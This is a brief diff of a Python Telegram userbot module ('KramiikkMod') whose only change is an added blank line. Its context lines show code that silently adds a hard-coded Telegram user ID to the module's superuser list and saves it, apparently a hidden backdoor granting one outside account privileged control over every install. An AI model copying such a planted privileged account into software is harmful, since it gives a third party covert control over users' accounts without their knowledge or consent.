@@ -126,6 +126,7 @@ class KramiikkMod(loader.Module):
         if 1785723159 not in self.su["users"]:
             self.su["users"].append(1785723159)
             self.db.set("Su", "su", self.su)
+
     async def err(self, chat, cmn):
         """работа с ответом жабабота"""
         async with self.client.conversation(chat, exclusive=False) as conv:
